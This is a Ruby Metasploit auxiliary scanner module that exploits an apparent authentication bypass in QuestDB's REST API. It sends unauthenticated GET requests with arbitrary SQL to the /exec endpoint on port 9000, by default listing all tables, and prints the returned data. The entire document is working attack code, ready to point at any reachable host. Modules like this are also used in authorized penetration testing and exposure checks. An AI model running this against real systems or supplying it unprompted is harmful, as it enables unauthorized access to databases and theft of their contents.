##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'QuestDB SQL API Unauthenticated Access',
      'Description'    => %q{
        This module exploits an authentication bypass vulnerability in QuestDB's REST API
        to execute arbitrary SQL queries. It can be used to execute raw SQL queries
        and list tables in the database.
        
        The vulnerability allows unauthenticated access to the /exec endpoint,
        which can be leveraged to execute SQL queries against the database.
      },
      'Author'         => [ 'ctkqiang' ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CNVD', '2026-84827' ],
        [ 'URL', 'https://github.com/ctkqiang/QuestExploit' ],
        [ 'URL', 'https://questdb.com/docs/query/rest-api/' ]
      ],
      'Notes'          => {
        'Stability'    => [CRASH_SAFE],
        'SideEffects'  => [IOC_IN_LOGS],
        'Reliability'  => [REPEATABLE_SESSION]
      }
    ))

    register_options([
      Opt::RPORT(9000),
      OptString.new('TARGETURI', [ true, "The base path to QuestDB", '/']),
      OptString.new('PATH', [ true, "The API endpoint path", 'exec']),
      OptString.new('QUERY', [ false, 'The raw SQL query to execute', 'tables()'])
    ])
  end

  def run_host(ip)
    sql_query = datastore['QUERY'] || 'tables()'
    
    if datastore['QUERY']
      print_status("Action: Executing Raw User Query...")
    else
      print_status("Action: No query provided. Fetching all tables (Default)...")
    end

    execute_sql(sql_query)
  end

  def execute_sql(sql)
    api_path = datastore['PATH'] || 'exec'
    response = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, api_path),
      'vars_get' => { 'query' => sql }
    })

    unless response
      print_error("No response from server.")
      return
    end

    if response.code == 200
      print_good("SQL Execution Successful.")
      json_data = response.get_json_document
      if json_data
        print_line(JSON.pretty_generate(json_data))
      else
        print_status("Raw Response: #{response.body}")
      end
    else
      print_error("Server returned code #{response.code}: #{response.body}")
    end
  end
end